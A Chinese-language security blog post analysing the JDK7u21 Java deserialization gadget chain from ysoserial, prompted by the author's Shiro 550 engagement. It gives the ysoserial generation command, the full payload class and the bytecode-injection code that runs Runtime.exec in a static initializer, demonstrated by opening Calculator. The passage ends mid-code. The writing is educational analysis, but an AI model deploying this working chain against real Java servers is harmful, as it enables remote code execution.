<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="e3a33535d3e7ccc60ff8c5f12692a020">JDK7u21反序列化链利用分析</h1>
<h2 data-content="1" id="03e3c5212d7a0fb3d6239f02f8fad2c8">0x0 前言</h2>
<p>  起因来源于某次的真实的项目经历，碰到Shiro 550,当时尝试各种常见序列化链都失败了，最后JDK7u21 这个序列化链能够成功执行命令，所以对此进行一番学习。</p>
<h2 data-content="1" id="18a3762aea06ee6c42bf812e14972a9d">0x1 前置知识</h2>
<h3 data-content="1" id="846d1c7207f180adba3a03f59b232def">0x1.1 三大概念</h3>
<p>学习JAVA相关内容内容之前，这三个经典概念都是可以回顾和学习。</p>
<p><strong>(1) JVM(Java Virtual Machine) </strong></p>
<blockquote>
<p>JVM(java虚拟机),是驻留于内存的抽象计算机。</p>
<p>1.1 主要构成:</p>
<p><strong>类加载器: 将.class 文件加载到内存</strong></p>
<p><strong>字节码验证工具: 检查代码中是否存在访问限制违规</strong></p>
<p><strong>执行引擎: 将字节码转换为可执行的机器码</strong></p>
<p><strong>JIT: 即时编译，用于提高JVM的性能，加快java程序的执行速度</strong></p>
<p>1.2 主要作用:</p>
<p>将java字节码(类文件.class,由JVM指令集, 符号表以及补充信息构成)解释为本地机器码(字节码映射本地机器码)，不同的操作系统使用不同的JVM映射规则，使java字节码的解释执行与操作系统无关，从而完成跨平台。</p>
<p><strong>JAVA语言的跨平台性是基于JVM的不跨平台性的</strong></p>
</blockquote>
<p><strong>(2) JRE(JAVA Runtime Environment)</strong></p>
<blockquote>
<p>JRE(java运行环境),由运行和管理JAVA应用程序的类库和工具组成。</p>
<p>单纯的JVM不能直接运行java程序，需要核心类库的支持,所以可以简单理解</p>
<p>JRE = JVM + 核心类库 + 一些工具(密钥库工具keytool, jar文件解压缩工具...)</p>
</blockquote>
<p><strong>(3) JDK(JAVA Development Kit)</strong></p>
<blockquote>
<p>java开发工具包，是面向JAVA开发人员使用的SDk(software Development Kit 软件开发工具包)</p>
<p>提供java程序的开发环境和运行环境。</p>
<p>JDK 包含了 JRE、基础类库(Java API，如网络、IO、线程、模型)、java源码编译器javac、以及其他一些开发、诊断、分析、调试、管理的工具和命令，如jar、javah、jdb等</p>
</blockquote>
<h3 data-content="1" id="083020d0748199def72c5f8dc0a350cb">0x1.2 jdk命名规则</h3>
<p>我们平时安装的java环境，大多是 Java SE Development Kit 8u261, 也就是所谓的jdk8,java8, jdk8。</p>
<p>为什么同一个东西，有这么多名称呢，其实这个跟jdk发布历史中改名有关。</p>
<p>1996-01-23 -1999-04-08 发行了 jdk1.0 - jdk1.1.8</p>
<p>1998-12-04 - 2003-0626 发行了 j2se 1.2 (jdk 1.2 开始了改名)</p>
<p>2004-09-30 发行了Java SE 5.0 (1.5.0) (jdk 1.5.0 又开始了改名)</p>
<p>..</p>
<p>Java SE 6.0 (1.6.0)</p>
<p>Java SE 7.0 (1.7.0)</p>
<p>...</p>
<p>Java SE 11.0</p>
<p>等</p>
<blockquote>
<h3>Java命名方式更改的事件原因：</h3>
<p>1998年12月8日，Sun公司发布了第二代Java平台（简称为Java2）的3个版本：J2ME（Java2 Micro  Edition，Java2平台的微型版），应用于移动、无线及有限资源的环境；J2SE（Java 2 Standard Edition，Java  2平台的标准版），应用于桌面环境；J2EE（Java 2Enterprise Edition，Java  2平台的企业版），应用于基于Java的应用服务器。</p>
<p>2004年9月30日，J2SE1.5发布。为了表示该版本的重要性，J2SE 1.5更名为Java SE 5.0（内部版本号1.5.0）</p>
<p>2005年6月，Java SE 6正式发布。此时，Java的各种版本已经更名，已取消其中的数字2（如J2EE更名为JavaEE，J2SE更名为JavaSE，J2ME则为JavaME）</p>
<p>java SE 主要应用于电脑上运行的软件】</p>
<p>java ee 是基于se基础上构建，是开发企业级应用的一套APi(标准)，主要应用于网站建设。</p>
<p>(其实我们平时用Spring 框架去开发 + tomcat 也可以的，根本不需要下载java ee的jdk)</p>
<p>java se 主要应用于移动设备和嵌入式设备的java应用程序</p>
</blockquote>
<p>java se ee me 他们所使用的jdk是一样的，区别的是，内置的类库存在差异。</p>
<h2 data-content="1" id="3e2f9009369d70bf507602aced12a1b2">0x2 调试环境搭建</h2>
<p>这里简单介绍我平时的工作流，每个人的爱好都不一样。</p>
<p><strong>1.调试工具:</strong></p>
<p>ideal(调试)、eclipse(开发)</p>
<p><strong>2.安装JDK不同版本:</strong></p>
<p>MAC homebrew 只能直接安装官方最新版的OpenJDK</p>
<pre><code>最新版:
brew install java
jdk8以上:
brew cask install AdoptOpenJDK/openjdk/adoptopenjdk8
brew cask install AdoptOpenJDK/openjdk/adoptopenjdk9
brew cask install AdoptOpenJDK/openjdk/adoptopenjdk10
brew cask install AdoptOpenJDK/openjdk/adoptopenjdk11
brew cask install AdoptOpenJDK/openjdk/adoptopenjdk12
jdk7:
brew cask install homebrew/cask-versions/zulu7
jdk6:
brew cask install homebrew/cask-versions/java6

再低就没有必要了,毕竟都2020年.</code></pre>
<p>查看系统已安装的java版本和路径:<code>/usr/libexec/java_home -V</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164011-1ecec72c-ccc0-1.png"/></p>
<p>这样子虽然方便，但是我们依然选择不了自己想要的大版本中的小版本，这里的1.7.0272 已经超过了漏洞的版本，经过测试，没办法打成功的。</p>
<p>那么如何安装更详细的版本呢?</p>
<p><a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html" target="_blank">java se 7所有小版本</a></p>
<p>选择合适的操作系统下载，傻瓜化安装即可。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164037-2ed3e4ae-ccc0-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164052-373b96be-ccc0-1.png"/></p>
<p><strong>3.下载</strong></p>
<p><code>git clone https://github.com/frohoff/ysoserial</code></p>
<p>编译:</p>
<pre><code>cd ysoserial
mvn clean package -DskipTests</code></pre>
<p>基本用法:</p>
<pre><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar  Jdk7u21 "whoami" &gt; jdk7u21Object.ser</code></pre>
<p>然后直接导入ideal中,下面我们直接在ideal进行ysoserial payload类的导入即可，这样子分析链也方便。</p>
<h2 data-content="1" id="c895a855da9d982de88fd80e3f71d2af">0x3 漏洞说明</h2>
<h3 data-content="1" id="2748d2225a22617db87be03d21780694">0x3.1 背景说明</h3>
<p>缺陷影响版本: JRE versions &lt;= 7u21</p>
<p>利用限制: 仅依赖于原生库函数</p>
<p>真实影响: 实战环境有机会遇到</p>
<h3 data-content="1" id="235f43bdffd9212200c72c1fa747536f">0x3.2 漏洞演示</h3>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">ysoserial.example</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">ysoserial.payloads.Jdk7u21</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.io.ByteArrayInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">JDK7u21</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">Object</span> <span class="n">calc</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Jdk7u21</span><span class="o">().</span><span class="na">getObject</span><span class="o">(</span><span class="s">"open /System/Applications/Calculator.app"</span><span class="o">);</span>

            <span class="n">ByteArrayOutputStream</span> <span class="n">byteArrayOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span><span class="c1">//用于存放person对象序列化byte数组的输出流</span>

            <span class="n">ObjectOutputStream</span> <span class="n">objectOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">byteArrayOutputStream</span><span class="o">);</span>
            <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">calc</span><span class="o">);</span><span class="c1">//序列化对象</span>
            <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
            <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>

            <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">byteArrayOutputStream</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">();</span> <span class="c1">//读取序列化后的对象byte数组</span>

            <span class="n">ByteArrayInputStream</span> <span class="n">byteArrayInputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">bytes</span><span class="o">);</span><span class="c1">//存放byte数组的输入流</span>

            <span class="n">ObjectInputStream</span> <span class="n">objectInputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="n">byteArrayInputStream</span><span class="o">);</span>
            <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">objectInputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>成功执行命令</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164114-44bdd946-ccc0-1.png"/></p>
<p>ysoserial的payload</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">ysoserial.payloads</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationHandler</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.LinkedHashSet</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.xml.transform.Templates</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">ysoserial.payloads.annotation.Authors</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">ysoserial.payloads.annotation.Dependencies</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">ysoserial.payloads.annotation.PayloadTest</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">ysoserial.payloads.util.Gadgets</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">ysoserial.payloads.util.JavaVersion</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">ysoserial.payloads.util.PayloadRunner</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">ysoserial.payloads.util.Reflections</span><span class="o">;</span>


<span class="cm">/*</span>

<span class="cm">Gadget chain that works against JRE 1.7u21 and earlier. Payload generation has</span>
<span class="cm">the same JRE version requirements.</span>

<span class="cm">See: https://gist.github.com/frohoff/24af7913611f8406eaf3</span>

<span class="cm">Call tree:</span>

<span class="cm">LinkedHashSet.readObject()</span>
<span class="cm">  LinkedHashSet.add()</span>
<span class="cm">    ...</span>
<span class="cm">      TemplatesImpl.hashCode() (X)</span>
<span class="cm">  LinkedHashSet.add()</span>
<span class="cm">    ...</span>
<span class="cm">      Proxy(Templates).hashCode() (X)</span>
<span class="cm">        AnnotationInvocationHandler.invoke() (X)</span>
<span class="cm">          AnnotationInvocationHandler.hashCodeImpl() (X)</span>
<span class="cm">            String.hashCode() (0)</span>
<span class="cm">            AnnotationInvocationHandler.memberValueHashCode() (X)</span>
<span class="cm">              TemplatesImpl.hashCode() (X)</span>
<span class="cm">      Proxy(Templates).equals()</span>
<span class="cm">        AnnotationInvocationHandler.invoke()</span>
<span class="cm">          AnnotationInvocationHandler.equalsImpl()</span>
<span class="cm">            Method.invoke()</span>
<span class="cm">              ...</span>
<span class="cm">                TemplatesImpl.getOutputProperties()</span>
<span class="cm">                  TemplatesImpl.newTransformer()</span>
<span class="cm">                    TemplatesImpl.getTransletInstance()</span>
<span class="cm">                      TemplatesImpl.defineTransletClasses()</span>
<span class="cm">                        ClassLoader.defineClass()</span>
<span class="cm">                        Class.newInstance()</span>
<span class="cm">                          ...</span>
<span class="cm">                            MaliciousClass.&lt;clinit&gt;()</span>
<span class="cm">                              ...</span>
<span class="cm">                                Runtime.exec()</span>
<span class="cm"> */</span>

<span class="nd">@SuppressWarnings</span><span class="o">({</span> <span class="s">"rawtypes"</span><span class="o">,</span> <span class="s">"unchecked"</span> <span class="o">})</span>
<span class="nd">@PayloadTest</span> <span class="o">(</span> <span class="n">precondition</span> <span class="o">=</span> <span class="s">"isApplicableJavaVersion"</span><span class="o">)</span>
<span class="nd">@Dependencies</span><span class="o">()</span>
<span class="nd">@Authors</span><span class="o">({</span> <span class="n">Authors</span><span class="o">.</span><span class="na">FROHOFF</span> <span class="o">})</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Jdk7u21</span> <span class="kd">implements</span> <span class="n">ObjectPayload</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="o">{</span>

    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">getObject</span><span class="o">(</span><span class="kd">final</span> <span class="n">String</span> <span class="n">command</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="kd">final</span> <span class="n">Object</span> <span class="n">templates</span> <span class="o">=</span> <span class="n">Gadgets</span><span class="o">.</span><span class="na">createTemplatesImpl</span><span class="o">(</span><span class="n">command</span><span class="o">);</span>

        <span class="n">String</span> <span class="n">zeroHashCodeStr</span> <span class="o">=</span> <span class="s">"f5a5a608"</span><span class="o">;</span>

        <span class="n">HashMap</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">zeroHashCodeStr</span><span class="o">,</span> <span class="s">"foo"</span><span class="o">);</span>

        <span class="n">InvocationHandler</span> <span class="n">tempHandler</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">Reflections</span><span class="o">.</span><span class="na">getFirstCtor</span><span class="o">(</span><span class="n">Gadgets</span><span class="o">.</span><span class="na">ANN_INV_HANDLER_CLASS</span><span class="o">).</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Override</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">map</span><span class="o">);</span>
        <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">tempHandler</span><span class="o">,</span> <span class="s">"type"</span><span class="o">,</span> <span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">Templates</span> <span class="n">proxy</span> <span class="o">=</span> <span class="n">Gadgets</span><span class="o">.</span><span class="na">createProxy</span><span class="o">(</span><span class="n">tempHandler</span><span class="o">,</span> <span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>

        <span class="n">LinkedHashSet</span> <span class="n">set</span> <span class="o">=</span> <span class="k">new</span> <span class="n">LinkedHashSet</span><span class="o">();</span> <span class="c1">// maintain order</span>
        <span class="n">set</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">templates</span><span class="o">);</span>
        <span class="n">set</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">proxy</span><span class="o">);</span>

        <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"_auxClasses"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
        <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"_class"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>

        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">zeroHashCodeStr</span><span class="o">,</span> <span class="n">templates</span><span class="o">);</span> <span class="c1">// swap in real object</span>

        <span class="k">return</span> <span class="n">set</span><span class="o">;</span>
    <span class="o">}</span>
</pre></div>
<p>可以看到payload不是很长，但是利用链中的调用还是比较多的，让我们来慢慢分析吧。</p>
<h2 data-content="1" id="3ff494408e52986fb61f72966bd0e8b0">0x4 漏洞分析</h2>
<h3 data-content="1" id="c69a252986c845f2f2f8c2fae5531d34">0x4.1 第一层  createTemplatesImpl</h3>
<p>别问我为什么这是第一层(payload都是层层嵌套的，这是第一句)</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164141-547f2d8a-ccc0-1.png"/></p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="n">T</span> <span class="nf">createTemplatesImpl</span> <span class="o">(</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">command</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="n">tplClass</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">abstTranslet</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">transFactory</span> <span class="o">)</span>
            <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
            <span class="c1">// 建立一个templates 对象</span>
        <span class="kd">final</span> <span class="n">T</span> <span class="n">templates</span> <span class="o">=</span> <span class="n">tplClass</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>

        <span class="c1">// use template gadget class</span>
        <span class="n">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
        <span class="n">pool</span><span class="o">.</span><span class="na">insertClassPath</span><span class="o">(</span><span class="k">new</span> <span class="n">ClassClassPath</span><span class="o">(</span><span class="n">StubTransletPayload</span><span class="o">.</span><span class="na">class</span><span class="o">));</span>
        <span class="n">pool</span><span class="o">.</span><span class="na">insertClassPath</span><span class="o">(</span><span class="k">new</span> <span class="n">ClassClassPath</span><span class="o">(</span><span class="n">abstTranslet</span><span class="o">));</span>
        <span class="kd">final</span> <span class="n">CtClass</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">StubTransletPayload</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
        <span class="c1">// run command in static initializer</span>
        <span class="c1">// TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span>
        <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="s">"java.lang.Runtime.getRuntime().exec(\""</span> <span class="o">+</span>
            <span class="n">command</span><span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"\\\\"</span><span class="o">,</span><span class="s">"\\\\\\\\"</span><span class="o">).</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"\""</span><span class="o">,</span> <span class="s">"\\\""</span><span class="o">)</span> <span class="o">+</span>
            <span class="s">"\");"</span><span class="o">;</span>
        <span class="n">clazz</span><span class="o">.</span><span class="na">makeClassInitializer</span><span class="o">().</span><span class="na">insertAfter</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
        <span class="c1">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span>
        <span class="n">clazz</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="s">"ysoserial.Pwner"</span> <span class="o">+</span> <span class="n">System</span><span class="o">.</span><span class="na">nanoTime</span><span class="o">());</span>
        <span class="n">CtClass</span> <span class="n">superC</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">abstTranslet</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
        <span class="n">clazz</span><span class="o">.</span><span class="na">setSuperclass</span><span class="o">(</span><span class="n">superC</span><span class="o">);</span>

        <span class="kd">final</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">classBytes</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>
            <span class="c1">// </span>

        <span class="c1">// inject class bytes into instance</span>
        <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"_bytecodes"</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]</span> <span class="o">{</span>
            <span class="n">classBytes</span><span class="o">,</span> <span class="n">ClassFiles</span><span class="o">.</span><span class="na">classAsBytes</span><span class="o">(</span><span class="n">Foo</span><span class="o">.</span><span class="na">class</span><span class="o">)</span>
        <span class="o">});</span>
        <span class="c1">// Foo.class 没什么很大作用，可能是凑数组数量的，删掉也ok</span>

        <span class="c1">// required to make TemplatesImpl happy</span>
        <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"_name"</span><span class="o">,</span> <span class="s">"Pwnr"</span><span class="o">);</span>
        <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"_tfactory"</span><span class="o">,</span> <span class="n">transFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">());</span>
        <span class="k">return</span> <span class="n">templates</span><span class="o">;</span>
    <span class="o">}</span>
</pre></div>
<p>这里分为两部分,一部分是javassist的动态注入，一部分是templates 属性的设置。</p>
<blockquote>
<p>javassist的作用:</p>
<p>通过动态字节码生成一个类，该类的静态代码块中存储恶意代码。</p>
<p>templates属性设置的作用:</p>
<p>Templates.newTransformer() 实例化该恶意类从而触发其静态代码块中的恶意代码。</p>
</blockquote>
<p>这部分的理解我们可以通过调试这个简单的触发语句来理解:</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">TemplatesImpl</span> <span class="n">calc</span> <span class="o">=</span> <span class="o">(</span><span class="n">TemplatesImpl</span><span class="o">)</span> <span class="n">Gadgets</span><span class="o">.</span><span class="na">createTemplatesImpl</span><span class="o">(</span><span class="s">"open /System/Applications/Calculator.app"</span><span class="o">);</span><span class="c1">//生成恶意的calc</span>
        <span class="n">calc</span><span class="o">.</span><span class="na">getOutputProperties</span><span class="o">();</span><span class="c1">//调用getOutputProperties就可以执行calc</span>
    <span class="o">}</span>
</pre></div>
<p>基本的调用栈如下:</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164154-5c3ab9cc-ccc0-1.png"/></p>
<p><code>calc.getOutputProperties()</code> 执行后</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164202-60f48d6c-ccc0-1.png"/></p>
<p>跳转去执行: <code>newTransformer().getOutputProperties()</code>  接着去执行<code>newTransformer()</code>这个方法。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164209-6542dee6-ccc0-1.png"/></p>
<p>可以看到在这个方法里面的第一个参数又调用了<code>getTransletInstance()</code>,继续跟进</p>
<div class="highlight"><pre><span></span><span class="n">transformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TransformerImpl</span><span class="o">(</span><span class="n">getTransletInstance</span><span class="o">(),</span> <span class="n">_outputProperties</span><span class="o">,</span>
            <span class="n">_indentNumber</span><span class="o">,</span> <span class="n">_tfactory</span><span class="o">);</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200723164217-6a237ad8-ccc0-1.png"/></p>
<p>我们没有设置<code>_class</code>属性,故进入<code>defineTransletClasses</code>方法。然后执行</p>
<p><code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code>调用<code>_class[_transletIndex]</code>类的无参构造方法,生成类对象。</p>
<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kt">void</span> <span class="nf">defineTransletClasses</span><span class="o">()</span>
        <span class="kd">throws</span> <span class="n">TransformerConfigurationException</span> <span class="o">{</span>

        <span class="c1">// 这里我们传入了值</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">_bytecodes</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">ErrorMsg</span> <span class="n">err</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ErrorMsg</span><span class="o">(</span><span class="n">ErrorMsg</span><span class="o">.</span><span class="na">NO_TRANSLET_CLASS_ERR</span><span class="o">);</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="n">TransformerConfigurationException</span><span class="o">(</span><span class="n">err</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
        <span class="o">}</span>

        <span class="c1">// 引入加载器</span>
        <span class="n">TransletClassLoader</span> <span class="n">loader</span> <span class="o">=</span> <span class="o">(</span><span class="n">TransletClassLoader</span><span class="o">)</span>
            <span class="n">AccessController</span><span class="o">.</span><span class="na">doPrivileged</span><span class="o">(</span><span class="k">new</span> <span class="n">PrivilegedAction</span><span class="o">()</span> <span class="o">{</span>
                <span class="kd">public</span> <span class="n">Object</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
                  <span class="c1">// 这里在其他版本会有一句_tfactory.getExternalExtensionsMap()</span>
                  <span class="c1">// 为了防止出错，所以我们给_tfactory 设置 transFactory.newInstance() 这个带有getExternalExtensionsMap方法的实例</span>
                  <span class="c1">// 7u21版本下其实加不加都没关系。</span>
                    <span class="k">return</span> <span class="k">new</span> 
                      <span class="n">TransletClassLoader</span><span class="o">(</span><span class="n">ObjectFactory</span><span class="o">.</span><span class="na">findClassLoader</span><span class="o">());</span>
                <span class="o">}</span>
            <span class="o">});</span>

        <span class="k">try</span> <span class="o">{</span>
            <span class="kd">final</span> <span class="kt">int</span> <span class="n">classCount</span> <span class="o">=</span> <span class="n">_bytecodes</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
            <span class="c1">// 根据_bytecodes传入的数目</span>
            <span class="n">_class</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="n">classCount</span><span class="o">];</span>

            <span class="k">if</span> <span class="o">(</span><span class="n">classCount</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">_auxClasses</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="o">();</span>
            <span class="o">}</span>

            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">classCount</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
                <span class="c1">// 加载字节码转化为对应的类</span>
                <span class="n">_class</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="n">loader</span><span class="o">.</span><span class="na">defineClass</span><span class="o">(</span><span class="n">_bytecodes</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
                <span class="kd">final</span> <span class="n">Class</span> <span class="n">superClass</span> <span class="o">=</span> <span class="n">_class</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getSuperclass</span><span class="o">();</span>

                <span class="c1">// Check if this is the main class</span>
                <span class="c1">// _transletIndex 默认值是-1</span>
                <span class="c1">// 所以为了不出错，所以这里字节码转换为对应类的时候，其父类必须是</span>
                <span class="c1">// ABSTRACT_TRANSLET = com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">superClass</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">ABSTRACT_TRANSLET</span><span class="o">))</span> <span class="o">{</span>
                    <span class="n">_transletIndex</span> <span class="o">=</span> <span class="n">i</span><span class="o">;</span>
                <span class="o">}</span>
                <span class="k">else</span> <span class="o">{</span>
                    <span class="n">_auxClasses</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">_class</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getName</span><span class="o">(),</span> <span class="n">_class</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
                <span class="o">}</span>
            <span class="o">}</span>

            <span class="k">if</span> <span class="o">(</span><span class="n">_transletIndex</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">ErrorMsg</span> <span class="n">err</span><span class="o">=</span> <span class="k">new</span> <span class="n">ErrorMsg</span><span class="o">(</span><span class="n">ErrorMsg</span><span class="o">.</span><span class="na">NO_MAIN_TRANSLET_ERR</span><span class="o">,</span> <span class="n">_name</span><span class="o">);</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="n">TransformerConfigurationException</span><span class="o">(</span><span class="n">err</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
            <span class="o">}</span>
        <span class="o">}</span>
        <span class="k">catch</span> <span class="o">(</span><span class="n">ClassFormatError</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
